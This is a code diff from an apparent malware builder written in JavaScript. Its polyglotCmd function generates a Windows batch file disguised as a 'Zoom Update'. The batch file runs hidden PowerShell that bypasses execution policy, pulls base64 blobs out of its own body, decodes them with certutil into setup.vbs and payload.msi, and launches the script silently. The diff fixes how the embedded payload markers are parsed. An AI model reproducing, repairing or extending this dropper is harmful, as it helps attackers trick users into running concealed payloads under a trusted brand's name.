@@ -295,15 +295,15 @@ function winVbsB64() {
 }
 function polyglotCmd(id, co) {
   const r = randHex(4);
-  const dv = '#<VBS>';
-  const dm = '#<MSI>';
+  const dv = '#@VBS@';
+  const dm = '#@MSI@';
   const head = '@echo off\r\nsetlocal\r\ntitle Zoom Update ' + randHex(2).toUpperCase() +
     '\r\nrem offline build ' + Date.now() + '-' + randHex(4) +
     '\r\nset "F=%~f0"\r\nset "D=%TEMP%\\z_' + r + '"\r\nmkdir "%D%" 2>nul\r\n' +
     'powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ' +
-    '"$s=[IO.File]::ReadAllText(\'%F%\');$a=$s.IndexOf(\'' + dv + '\');$b=$s.IndexOf(\'' + dm +
-    '\');[IO.File]::WriteAllText(\'%D%\\v.b64\',$s.Substring($a+6,$b-$a-6).Trim(),[Text.Encoding]::ASCII);' +
-    '[IO.File]::WriteAllText(\'%D%\\m.b64\',$s.Substring($b+6).Trim(),[Text.Encoding]::ASCII)"\r\n' +
+    '"$s=[IO.File]::ReadAllText(\'%F%\');$a=$s.LastIndexOf(\'' + dv + '\');$b=$s.LastIndexOf(\'' + dm +
+    '\');[IO.File]::WriteAllText(\'%D%\\v.b64\',$s.Substring($a+7,$b-$a-7).Trim(),[Text.Encoding]::ASCII);' +
+    '[IO.File]::WriteAllText(\'%D%\\m.b64\',$s.Substring($b+7).Trim(),[Text.Encoding]::ASCII)"\r\n' +
     'certutil -f -decode "%D%\\v.b64" "%D%\\setup.vbs" >nul 2>&1\r\n' +
     'certutil -f -decode "%D%\\m.b64" "%D%\\payload.msi" >nul 2>&1\r\n' +
     'wscript //B "%D%\\setup.vbs"\r\n' +
